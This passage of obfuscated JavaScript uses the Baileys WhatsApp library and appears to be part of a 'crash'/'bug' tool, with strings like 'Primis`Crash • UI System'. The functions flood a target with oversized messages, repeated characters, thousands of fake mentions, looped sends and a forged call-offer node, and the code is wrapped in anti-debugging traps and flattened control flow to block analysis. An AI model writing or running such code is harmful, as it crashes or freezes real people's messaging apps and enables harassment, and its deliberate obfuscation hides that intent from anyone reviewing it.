      const めはぬこ = await ゆえつみおか[すたきや[526]](うぬせ, {
        [すたきや[227] + すたきや[228] + すたきや[229]]: {
          [すたきや[148] + すたきや[149]]: {},
          [すたきや[92]]: {
            [すたきや[43]]: すたきや[256] + すたきや[319],
            [すたきや[150]]: "EXTENSION_1"
          },
          [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
            [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
            [すたきや[157] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
              [すたきや[356] + すたきや[357]]: "香"[すたきや[56]](すたきや[372])
            }),
            [すたきや[159] + すたきや[71]]: すたきや[19]
          }
        }
      }, {});
      await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, {
        [すたきや[134] + すたきや[135] + すたきや[46] + すたきや[213]]: {
          [すたきや[104] + すたきや[44]]: めはぬこ[すたきや[104] + すたきや[44]]
        }
      }, {
        [すたきや[50] + すたきや[51]]: {
          [すたきや[74]]: うぬせ
        }
      });
    }
  } catch (ちせそ) {
    console[すたきや[295]](すたきや[358], ちせそ);
  }
}
async function あけは([くめうめみか, うぬせ = すたきや[4]], ゆえつみおか) {
  let すかく = await ゆえつみおか[すたきや[525]](くめうめみか, {
    [すたきや[78] + すたきや[359] + すたきや[147]]: {
      [すたきや[43]]: すたきや[360],
      [すたきや[132] + すたきや[361]]: すたきや[256] + すたきや[319],
      [すたきや[110] + すたきや[320]]: すたきや[256] + すたきや[319],
      [すたきや[78] + すたきや[77]]: [{
        [すたきや[78] + すたきや[294]]: すたきや[362],
        [すたきや[78] + すたきや[320]]: {
          [すたきや[363] + すたきや[321]]: すたきや[322] + すたきや[364] + すたきや[158][すたきや[56]](すたきや[296])
        },
        [すたきや[139]]: すたきや[1]
      }],
      [すたきや[113] + すたきや[365]]: すたきや[1]
    }
  }, {});
  await ゆえつみおか[すたきや[366]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], すかく[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
    [すたきや[85] + すたきや[173] + すたきや[128]]: [くめうめみか],
    [すたきや[140] + すたきや[141] + すたきや[142]]: [{
      [すたきや[129]]: すたきや[143],
      [すたきや[131]]: {},
      [すたきや[132] + すたきや[128]]: [{
        [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: くめうめみか
          },
          [すたきや[132] + すたきや[128]]: すたきや[23]
        }]
      }]
    }]
  });
  if (うぬせ) {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    await ゆえつみおか[すたきや[366]][すたきや[49] + すたきや[46]](くめうめみか, {
      [すたきや[367] + すたきや[368] + すたきや[369] + すたきや[44]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[137] + すたきや[138] + すたきや[103]]: {
            [すたきや[45]]: すかく[すたきや[45]],
            [すたきや[139]]: すたきや[268]
          }
        }
      }
    }, {
      [すたきや[140] + すたきや[141] + すたきや[142]]: [{
        [すたきや[129]]: すたきや[143],
        [すたきや[131]]: {
          [すたきや[353] + すたきや[354] + すたきや[355]]: すたきや[817] + "mis👾"
        },
        [すたきや[132] + すたきや[128]]: すたきや[23]
      }]
    });
  }
}
async function えたすにたか([くめうめみか], うぬせ) {
  debugger;
  for (let ゆえつみおか = すたきや[0]; ゆえつみおか < 50; ゆえつみおか++) {
    let すかく = うぬせ[すたきや[523]](くめうめみか, {
      [すたきや[126] + すたきや[127] + "ageV2"]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[348] + すたきや[349] + すたきや[350] + すたきや[42]]: {
            [すたきや[148] + すたきや[149]]: {
              [すたきや[130] + すたきや[401]]: Array[すたきや[217]]({
                [すたきや[79]]: すたきや[218]
              }, () => {
                debugger;
                return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[370]) + (すたきや[80] + すたきや[81] + すたきや[82]);
              })
            },
            [すたきや[92]]: {
              [すたきや[43]]: すたきや[371][すたきや[56]](45000),
              [すたきや[150]]: すたきや[151] + すたきや[152]
            },
            [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
              [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
              [すたきや[157] + すたきや[91]]: すたきや[273] + すたきや[274] + すたきや[275] + すたきや[371][すたきや[56]](すたきや[372]) + (すたきや[373] + すたきや[374] + "ion\": \"3\"}"),
              [すたきや[159] + すたきや[71]]: すたきや[19]
            }
          }
        }
      }
    }, {});
    await うぬせ[すたきや[522]][すたきや[49] + すたきや[46]](くめうめみか, {
      [すたきや[134] + すたきや[135] + すたきや[46] + すたきや[213]]: {
        [すたきや[104] + すたきや[44]]: すかく[すたきや[104] + すたきや[44]]
      }
    }, {
      [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: くめうめみか
      }
    });
  }
  ;
  await うぬせ[すたきや[524]](すたきや[177]);
}
async function まそすゆ([うぬせ], ゆえつみおか) {
  const すかく = {
    [すたきや[122]]: "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
    [すたきや[329] + すたきや[211]]: すたきや[375] + すたきや[376],
    [すたきや[332] + すたきや[333]]: "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
    [すたきや[330] + すたきや[331]]: すたきや[377] + すたきや[378] + "00",
    [すたきや[379]]: すたきや[380],
    [すたきや[381]]: すたきや[380],
    [すたきや[100] + すたきや[225]]: "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
    [すたきや[334] + すたきや[335] + すたきや[336]]: "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
    [すたきや[337] + すたきや[338]]: "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
    [すたきや[100] + すたきや[342] + すたきや[343]]: "1738686532",
    [すたきや[120] + すたきや[121] + すたきや[101]]: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
    [すたきや[382] + すたきや[383]]: "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw=" + すたきや[384],
    [すたきや[385] + すたきや[386]]: くめうめみか([4102, 6420, 2226, 6362], 14),
    midQualityFileSha256: "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
  };
  const めはぬこ = await prepareWAMessageMedia({
    [すたきや[442]]: すかく
  }, {
    upload: ゆえつみおか[すたきや[396]].waUploadToServer
  });
  let ちせそ = [];
  for (let そしねめ = すたきや[0]; そしねめ < すたきや[243]; そしねめ++) {
    ちせそ[すたきや[387]]({
      [すたきや[148] + すたきや[149]]: {
        [すたきや[130] + すたきや[179]]: [すたきや[182] + すたきや[205] + すたきや[202] + すたきや[203] + すたきや[204], ...Array[すたきや[217]]({
          [すたきや[79]]: すたきや[323]
        }, () => {
          return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[287]) + (すたきや[80] + すたきや[81] + すたきや[82]);
        })]
      },
      [すたきや[92]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[109]][すたきや[96] + すたきや[97]]({
        [すたきや[43]]: "❗❗❗❗❗❗❗❗❗" + すたきや[325][すたきや[56]](すたきや[216])
      }),
      [すたきや[113]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[114]][すたきや[96] + すたきや[97]]({
        [すたきや[115] + すたきや[116] + すたきや[117]]: すたきや[4],
        [すたきや[389] + すたきや[46]]: めはぬこ[すたきや[389] + すたきや[46]]
      }),
      [すたきや[89] + すたきや[102] + すたきや[42]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[390] + すたきや[102] + すたきや[42]][すたきや[96] + すたきや[97]]({
        [すたきや[78] + すたきや[77]]: [{
          [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
          [すたきや[78] + すたきや[297] + すたきや[91]]: すたきや[273] + すたきや[274] + すたきや[275] + すたきや[325][すたきや[56]](すたきや[216]) + ("\",\"flow_message_version\":\"3\"" + すたきや[391])
        }, {
          [すたきや[90]]: "cta_ur" + すたきや[101],
          [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
            [すたきや[363] + すたきや[509]]: すたきや[325][すたきや[56]](すたきや[216]),
            [すたきや[122]]: すたきや[169] + "//Wa.m" + "e/stic" + "kerpac" + "k/X",
            [すたきや[206] + "nt_url"]: "https://Wa.me/stickerpack/Y"
          })
        }]
      })
    });
  }
  let ぬめくほき = await ゆえつみおか[すたきや[520]](うぬせ, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[104] + すたきや[270] + すたきや[271]]: {
          [すたきや[105] + すたきや[106] + すたきや[107]]: {},
          [すたきや[105] + すたきや[106] + すたきや[107] + すたきや[392] + すたきや[71]]: すたきや[12]
        },
        [すたきや[108] + すたきや[93] + すたきや[46]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[96] + すたきや[97]]({
          [すたきや[92]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[109]][すたきや[112]]({
            [すたきや[43]]: " # 🚯 - Primis`Crash • UI System \n" + すたきや[325][すたきや[56]](すたきや[216])
          }),
          [すたきや[110]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[111]][すたきや[112]]({
            [すたきや[43]]: " ─ᴅׅ֮ꜱׁׅܻ݊ᴘׁׁׅʀ݊ɪׁׁׅᴍ݊ɪׁׁׅꜱ." + すたきや[39]
          }),
          [すたきや[113]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[114]][すたきや[112]]({
            [すたきや[115] + すたきや[116] + すたきや[117]]: すたきや[2]
          }),
          [すたきや[393] + すたきや[118] + すたきや[103]]: ゆえつみおか[すたきや[388]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[394] + すたきや[118] + すたきや[103]][すたきや[96] + すたきや[97]]({
            [すたきや[395]]: [...ちせそ]
          })
        })
      }
    }
  }, {});
  await ゆえつみおか[すたきや[521]](すたきや[243]);
  await ゆえつみおか[すたきや[396]][すたきや[49] + すたきや[46]](うぬせ, ぬめくほき[すたきや[104] + すたきや[44]], {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: うぬせ
    },
    [すたきや[104] + すたきや[172]]: ぬめくほき[すたきや[45]][すたきや[47]]
  });
}
async function つめちねめ([くめうめみか, うぬせ = すたきや[2]], ゆえつみおか) {
  debugger;
  const {
    encodeSignedDeviceIdentity: すかく,
    ["jidEnc" + すたきや[397]]: めはぬこ,
    ["jidDec" + すたきや[397]]: ちせそ,
    [すたきや[398] + すたきや[403] + すたきや[103]]: そしねめ,
    [すたきや[407] + すたきや[46] + すたきや[408] + すたきや[409] + すたきや[14]]: ぬめくほき,
    [すたきや[398] + "Newsle" + すたきや[801] + すたきや[42]]: むほえ
  } = require("@whiskeysockets/baileys");
  const まうぬへ = (await ゆえつみおか[すたきや[400]]["getUSyncDevi" + すたきや[499]]([くめうめみか], すたきや[2], すたきや[2]))[すたきや[410]](({
    [すたきや[413]]: くめうめみか,
    [すたきや[105]]: うぬせ
  }) => {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    return "" + くめうめみか + すたきや[399] + (うぬせ || "") + (すたきや[80] + すたきや[81] + すたきや[82]);
  });
  await ゆえつみおか[すたきや[400]]["assertSessio" + すたきや[401]](まうぬへ);
  const ほふはも = () => {
    const くめうめみか = {};
    return {
      [すたきや[414]](...うぬせ) {
        (function () {
          var うぬせ = function () {
            const すかく = function () {
              const すかく = new RegExp(すたきや[75]);
              return すかく[すたきや[76]](うぬせ);
            };
            if (すかく()) {
              while (すたきや[4]) {}
            }
          };
          return うぬせ();
        })();
        var すかく = {
          get [すたきや[402]]() {
            return くめうめみか;
          },
          set [すたきや[402]](うぬせ) {
            くめうめみか = うぬせ;
          }
        };
        return ゆえつみおか[すたきや[519]](うぬせ, すかく);
      }
    };
  };
  const めつにた = ほふはも();
  const まうはけひう = くめうめみか => {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    return Buffer[すたきや[421]]([Buffer[すたきや[217]](くめうめみか), Buffer[すたきや[422]](すたきや[423], すたきや[1])]);
  };
  const へあは = ゆえつみおか[すたきや[400]][すたきや[112] + すたきや[404] + すたきや[405] + すたきや[406]].bind(ゆえつみおか[すたきや[400]]);
  const ててむすね = ゆえつみおか[すたきや[400]][すたきや[398] + すたきや[403] + すたきや[103]]?.bind(ゆえつみおか[すたきや[400]]);
  ゆえつみおか[すたきや[400]][すたきや[112] + すたきや[404] + すたきや[405] + すたきや[406]] = async (くめうめみか, うぬせ, すかく, めはぬこ) => {
    if (!くめうめみか[すたきや[79]]) {
      (function () {
        var くめうめみか = function () {
          const うぬせ = function () {
            const うぬせ = new RegExp(すたきや[75]);
            return うぬせ[すたきや[76]](くめうめみか);
          };
          if (うぬせ()) {
            while (すたきや[4]) {}
          }
        };
        return くめうめみか();
      })();
      return {
        [すたきや[415]]: [],
        [すたきや[416] + すたきや[417] + すたきや[418] + すたきや[419] + すたきや[420]]: すたきや[2]
      };
    }
    const ぬめくほき = await (ゆえつみおか[すたきや[400]][すたきや[407] + すたきや[46] + すたきや[408] + すたきや[409] + すたきや[14]]?.(うぬせ, くめうめみか) ?? うぬせ);
    const むほえ = Array[すたきや[825] + すたきや[424]](ぬめくほき) ? ぬめくほき : くめうめみか[すたきや[410]](くめうめみか => {
      (function () {
        var くめうめみか = function () {
          const うぬせ = function () {
            const うぬせ = new RegExp(すたきや[75]);
            return うぬせ[すたきや[76]](くめうめみか);
          };
          if (うぬせ()) {
            while (すたきや[4]) {}
          }
        };
        return くめうめみか();
      })();
      return {
        [すたきや[411] + すたきや[412]]: くめうめみか,
        [すたきや[104] + すたきや[44]]: ぬめくほき
      };
    });
    const {
      [すたきや[47]]: まうぬへ,
      [すたきや[812]]: ほふはも
    } = ゆえつみおか[すたきや[400]][すたきや[432] + すたきや[433]][すたきや[434]][すたきや[222]];
    const へあは = ほふはも ? ちせそ(ほふはも)?.user : すたきや[37];
    let うよむに = すたきや[2];
    const ゆさね = await Promise.all(むほえ[すたきや[410]](async ({
      [すたきや[411] + すたきや[412]]: くめうめみか,
      [すたきや[104] + すたきや[44]]: うぬせ
    }) => {
      const {
        [すたきや[413]]: ぬめくほき
      } = ちせそ(くめうめみか);
      const {
        [すたきや[413]]: むほえ
      } = ちせそ(まうぬへ);
      const ゆさね = ぬめくほき === むほえ || ぬめくほき === へあは;
      const えゆそい = くめうめみか === まうぬへ || くめうめみか === ほふはも;
      if (めはぬこ && ゆさね && !えゆそい) {
        debugger;
        うぬせ = めはぬこ;
      }
      const きふたよさ = まうはけひう(ててむすね ? ててむすね(うぬせ) : そしねめ(うぬせ));
      return めつにた[すたきや[414]](くめうめみか, async () => {
        debugger;
        const {
          [すたきや[139]]: うぬせ,
          ["cipher" + すたきや[43]]: ぬめくほき
        } = await ゆえつみおか[すたきや[400]].signalRepository["encryptMessa" + すたきや[147]]({
          [すたきや[74]]: くめうめみか,
          [すたきや[787]]: きふたよさ
        });
        if (うぬせ === "pkmsg") {
          debugger;
          うよむに = すたきや[4];
        }
        return {
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: くめうめみか
          },
          [すたきや[132] + すたきや[128]]: [{
            [すたきや[129]]: すたきや[425],
            [すたきや[131]]: {
              v: すたきや[431],
              [すたきや[139]]: うぬせ,
              ...すかく
            },
            [すたきや[132] + すたきや[128]]: ぬめくほき
          }]
        };
      });
    }));
    return {
      [すたきや[415]]: ゆさね[すたきや[488]](Boolean),
      [すたきや[416] + すたきや[417] + すたきや[418] + すたきや[419] + すたきや[420]]: うよむに
    };
  };
  const うよむに = ゆえつみおか[すたきや[439]][すたきや[261] + すたきや[307]](すたきや[308]);
  const ゆさね = Buffer[すたきや[421]]([うよむに, Buffer[すたきや[422]](すたきや[423], すたきや[1])]);
  const {
    [すたきや[415]]: えゆそい,
    shouldIncludeDeviceIdentity: なぬけせ
  } = await ゆえつみおか[すたきや[400]][すたきや[112] + すたきや[404] + すたきや[405] + すたきや[406]](まうぬへ, {
    [すたきや[457] + すたきや[458]]: すたきや[424]
  }, {
    count: すたきや[99]
  });
  const きふたよさ = [{
    [すたきや[129]]: すたきや[426],
    [すたきや[131]]: {
      [すたきや[425]]: すたきや[427],
      [すたきや[428]]: "16000"
    }
  }, {
    [すたきや[129]]: すたきや[426],
    [すたきや[131]]: {
      [すたきや[425]]: すたきや[427],
      [すたきや[428]]: "8000"
    }
  }, {
    [すたきや[129]]: すたきや[82],
    [すたきや[131]]: {
      medium: すたきや[429]
    }
  }, {
    [すたきや[129]]: "capability",
    [すたきや[131]]: {
      ver: すたきや[266]
    },
    [すたきや[132] + すたきや[128]]: new Uint8Array([すたきや[1], すたきや[430], 247, 9, 228, 250, すたきや[1]])
  }, {
    [すたきや[129]]: "encopt",
    [すたきや[131]]: {
      keygen: すたきや[431]
    }
  }, {
    [すたきや[129]]: "destin" + すたきや[435],
    [すたきや[131]]: {},
    [すたきや[132] + すたきや[128]]: えゆそい
  }, ...(なぬけせ ? [{
    [すたきや[129]]: すたきや[105] + "-ident" + すたきや[420],
    [すたきや[131]]: {},
    [すたきや[132] + すたきや[128]]: すかく(ゆえつみおか[すたきや[400]][すたきや[432] + すたきや[433]][すたきや[434]]["accoun" + すたきや[128]], すたきや[4])
  }] : [])];
  if (うぬせ) {
    きふたよさ[すたきや[595]](すたきや[12], すたきや[0], {
      [すたきや[129]]: すたきや[788],
      [すたきや[131]]: {
        ["orient" + すたきや[435]]: すたきや[99],
        [すたきや[436] + "_width"]: すたきや[437],
        [すたきや[436] + "_heigh" + すたきや[128]]: すたきや[437],
        [すたきや[105] + "_orien" + "tation"]: すたきや[99],
        [すたきや[425]]: すたきや[438],
        dec: すたきや[438]
      }
    });
  }
  const ふてく = {
    [すたきや[129]]: "call",
    [すたきや[131]]: {
      [すたきや[176]]: くめうめみか,
      [すたきや[47]]: ゆえつみおか[すたきや[400]].generateMessageTag(),
      [すたきや[217]]: ゆえつみおか[すたきや[400]][すたきや[413]][すたきや[47]]
    },
    [すたきや[132] + すたきや[128]]: [{
      [すたきや[129]]: "offer",
      [すたきや[131]]: {
        ["call-i" + すたきや[209]]: ゆえつみおか[すたきや[439]][すたきや[261] + すたきや[307]](すたきや[5])[すたきや[20] + すたきや[21]]("hex")[すたきや[478]](すたきや[0], 64)["toUppe" + すたきや[479]](),
        "call-creator": ゆえつみおか[すたきや[400]][すたきや[413]][すたきや[47]]
      },
      [すたきや[132] + すたきや[128]]: きふたよさ
    }]
  };
  await ゆえつみおか[すたきや[400]].sendNode(ふてく);
  console[すたきや[440]](ゆえつみおか[すたきや[518]][すたきや[623]](すたきや[639] + すたきや[640] + すたきや[641] + すたきや[642]));
}
function ふなせさ([くめうめみか, うぬせ], ゆえつみおか) {
  function* すかく(すかく, ちせそ, そしねめ, ぬめくほき, むほえ = {
    おとぬ: {}
  }) {
    while (すかく + ちせそ + そしねめ + ぬめくほき !== 127) {
      with (むほえ.つめそおあ || むほえ) {
        switch (すかく + ちせそ + そしねめ + ぬめくほき) {
          case -99:
          case -42:
          case むほえ.おとぬ.とむい + 128:
            むほえ.つめそおあ = むほえ.ゆくさかそ;
            すかく += -525;
            ちせそ += 231;
            そしねめ += 40;
            ぬめくほき += 370;
            break;
            if (ぬめくほき == -(そしねめ + 439)) {
              むほえ.つめそおあ = むほえ.おとぬ;
              すかく += -801;
              ちせそ += 231;
              そしねめ += 611;
              break;
            }
          case 40:
          case ちせそ + 70:
            [むほえ.おとぬ.とむい, むほえ.おとぬ.きえぬししき] = [-117, 108];
            ゆえつみおか[すたきや[402]][くめうめみか] ??= {
              [すたきや[441]]: Promise[すたきや[ちせそ + 494] + すたきや[44]]()
            };
            ゆえつみおか[すたきや[そしねめ + 56]][くめうめみか][すたきや[ちせそ + 461]] = (async すかく => {
              (function () {
                var すかく = function () {
                  const ちせそ = function () {
                    const ちせそ = new RegExp(すたきや[75]);
                    return ちせそ[すたきや[76]](すかく);
                  };
                  if (ちせそ()) {
                    while (すたきや[4]) {}
                  }
                };
                return すかく();
              })();
              try {
                debugger;
                await すかく;
              } catch {}
              return うぬせ();
            })(ゆえつみおか[すたきや[402]][くめうめみか][すたきや[441]]);
            めはぬこ = true;
            return ゆえつみおか[すたきや[402]][くめうめみか][すたきや[441]];
            すかく += 354;
            ちせそ += 38;
            そしねめ += -502;
            ぬめくほき += 187;
            break;
            if (!(ぬめくほき == -26)) {
              むほえ.つめそおあ = むほえ.おとぬ;
              すかく += 78;
              ちせそ += 38;
              そしねめ += 69;
              ぬめくほき += -183;
              break;
            }
          case ちせそ + 34:
          case -33:
            むほえ.つめそおあ = むほえ.せとひにこす;
            すかく += -78;
            ちせそ += -38;
            そしねめ += -69;
            ぬめくほき += 183;
            break;
          case 181:
          case すかく + 295:
          case -154:
            むほえ.つめそおあ = むほえ.へきの;
            すかく += -52;
            ちせそ += -494;
            そしねめ += 316;
            ぬめくほき += 183;
            break;
          default:
          case 48:
          case 2:
            ゆえつみおか[すたきや[ちせそ + 535]][くめうめみか] ??= {
              [すたきや[ちせそ + 574]]: Promise[すたきや[ちせそ + 607] + すたきや[ちせそ + 177]]()
            };
            ゆえつみおか[すたきや[402]][くめうめみか][すたきや[ちせそ + 574]] = (async すかく => {
              (function () {
                var すかく = function () {
                  const ちせそ = function () {
                    const ちせそ = new RegExp(すたきや[75]);
                    return ちせそ[すたきや[76]](すかく);
                  };
                  if (ちせそ()) {
                    while (すたきや[4]) {}
                  }
                };
                return すかく();
              })();
              try {
                debugger;
                await すかく;
              } catch {}
              return うぬせ();
            })(ゆえつみおか[すたきや[ちせそ + 535]][くめうめみか][すたきや[441]]);
            めはぬこ = true;
            return ゆえつみおか[すたきや[402]][くめうめみか][すたきや[441]];
            むほえ.つめそおあ = むほえ.あねめは;
            すかく += 302;
            ちせそ += 151;
            そしねめ += -575;
            ぬめくほき += 3;
            break;
            if (!(ぬめくほき == -26)) {
              むほえ.つめそおあ = むほえ.おとぬ;
              すかく += 26;
              ちせそ += 151;
              そしねめ += -4;
              ぬめくほき += -367;
              break;
            }
          case ぬめくほき - 40:
            if (ちせそ == -180) {
              むほえ.つめそおあ = むほえ.ねやい;
              すかく += 302;
              ちせそ += 231;
              そしねめ += -527;
              ぬめくほき += 370;
              break;
            }
          case -171:
          case そしねめ != 371 && そしねめ - 620:
            [むほえ.おとぬ.とむい, むほえ.おとぬ.きえぬししき] = [-157, -65];
            if (ちせそ == -180) {
              むほえ.つめそおあ = むほえ.むとそく;
              すかく += 302;
              ちせそ += 231;
              そしねめ += -563;
              ぬめくほき += 370;
              break;
            }
        }
      }
    }
  }
  var めはぬこ;
  var ちせそ = すかく(-250, -20, 346, -26).next().value;
  if (めはぬこ) {
    return ちせそ;
  }
}
async function てすさも([くめうめみか], うぬせ) {
  debugger;
  const ゆえつみおか = [{
    [すたきや[78] + すたきや[294]]: ".motupatlu",
    [すたきや[78] + すたきや[320]]: {
      [すたきや[363] + すたきや[321]]: "←𝐁͢𝐀͡𝐂͜𝐊 ⍣᳟ 𝐓͜𝐎͢ ᗰ̶̈́͟𝑶𝑻̶ᐁ𝑼 ᑭ̶ᐁ𝑨͢𝑻̽͢𝑳𝑼፮▾🦠"
    },
    [すたきや[139]]: すたきや[1]
  }];
  const すかく = {
    [すたきや[442]]: {
      [すたきや[122]]: うぬせ[すたきや[510]]
    },
    [すたきや[70] + すたきや[71]]: くめうめみか,
    [すたきや[110]]: "િᗰ̶̈́͟𝑶𝑻̶ᐁ𝑼 ᑭ̶ᐁ𝑨͢𝑻̽͢𝑳𝑼፮▾▾ ༑̴⟆",
    [すたきや[78] + すたきや[77]]: ゆえつみおか,
    [すたきや[113] + すたきや[365]]: すたきや[9],
    [すたきや[148] + すたきや[149]]: {
      [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[606],
      [すたきや[231] + すたきや[232]]: すたきや[4],
      [すたきや[233] + すたきや[443] + すたきや[444] + すたきや[445] + すたきや[239]]: {
        [すたきや[210] + すたきや[240] + すたきや[209]]: "1@",
        [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[37],
        [すたきや[210] + すたきや[241] + すたきや[222]]: " UPDATE "
      }
    },
    [すたきや[126] + すたきや[608]]: すたきや[4]
  };
  return await うぬせ[すたきや[511]][すたきや[41] + すたきや[42]](うぬせ[すたきや[512]][すたきや[446]], すかく, {
    [すたきや[184]]: うぬせ[すたきや[513]]
  });
}
function えめくひとね(くめうめみか, うぬせ = すたきや[1]) {
  function* ゆえつみおか(ゆえつみおか, めはぬこ, ちせそ, そしねめ, ぬめくほき = {
    よいあきあゆ: {}
  }) {
    while (ゆえつみおか + めはぬこ + ちせそ + そしねめ !== -63) {
      with (ぬめくほき.かきたへこた || ぬめくほき) {
        switch (ゆえつみおか + めはぬこ + ちせそ + そしねめ) {
          default:
          case -8:
            [ぬめくほき.よいあきあゆ.そにとやお, ぬめくほき.よいあきあゆ.やゆそいて] = [-51, -3];
            debugger;
            Object.defineProperty(くめうめみか, すたきや[79], {
              "value": うぬせ,
              configurable: すたきや[ちせそ + 38]
            });
            ぬめくほき.かきたへこた = ぬめくほき.よいあきあゆ;
            ゆえつみおか += -608;
            めはぬこ += 221;
            ちせそ += 154;
            そしねめ += 128;
            break;
          case 201:
          case めはぬこ - 404:
          case 154:
            すかく = true;
            return くめうめみか;
            ぬめくほき.かきたへこた = ぬめくほき.ねそくこお;
            ゆえつみおか += 384;
            ちせそ += -356;
            そしねめ += 78;
            break;
            if (!(めはぬこ > ちせそ + -61)) {
              ぬめくほき.かきたへこた = ぬめくほき.よいあきあゆ;
              break;
            }
          case -90:
          case -70:
          case -157:
            [ぬめくほき.よいあきあゆ.そにとやお, ぬめくほき.よいあきあゆ.やゆそいて] = [210, -28];
            debugger;
            Object.defineProperty(くめうめみか, すたきや[めはぬこ + -156], {
              "value": うぬせ,
              configurable: すたきや[2]
            });
            ぬめくほき.かきたへこた = ぬめくほき.よいあきあゆ;
            ゆえつみおか += -290;
            ちせそ += 356;
            そしねめ += -78;
            break;
          case ゆえつみおか != -216 && ゆえつみおか != -122 && ゆえつみおか + 59:
            [ぬめくほき.よいあきあゆ.そにとやお, ぬめくほき.よいあきあゆ.やゆそいて] = [111, 213];
            ぬめくほき.かきたへこた = ぬめくほき.よいあきあゆ;
            ゆえつみおか += -323;
            ちせそ += 356;
            そしねめ += -78;
            break;
            if (ゆえつみおか == 128) {
              ぬめくほき.かきたへこた = ぬめくほき.ひねその;
              ゆえつみおか += 285;
              めはぬこ += -221;
              ちせそ += 202;
              そしねめ += -206;
              break;
            }
        }
      }
    }
  }
  var すかく;
  var めはぬこ = ゆえつみおか(102, 14, -36, -144).next().value;
